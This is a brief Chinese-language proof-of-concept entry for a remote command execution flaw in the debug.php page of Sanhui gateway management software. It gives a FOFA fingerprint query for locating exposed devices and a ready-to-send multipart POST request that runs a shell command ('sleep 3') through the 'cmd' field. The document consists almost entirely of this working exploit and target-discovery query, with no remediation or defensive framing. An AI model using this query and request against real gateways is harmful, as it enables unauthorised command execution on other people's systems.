# 三汇网关管理软件debug.php远程命令执行漏洞



## fofa

```yaml
body="text ml10 mr20" && title="网关管理软件"
```

## poc

```yaml
POST /debug.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb

------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="comdtype"

1
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="cmd"

sleep 3
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="run"

------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
```

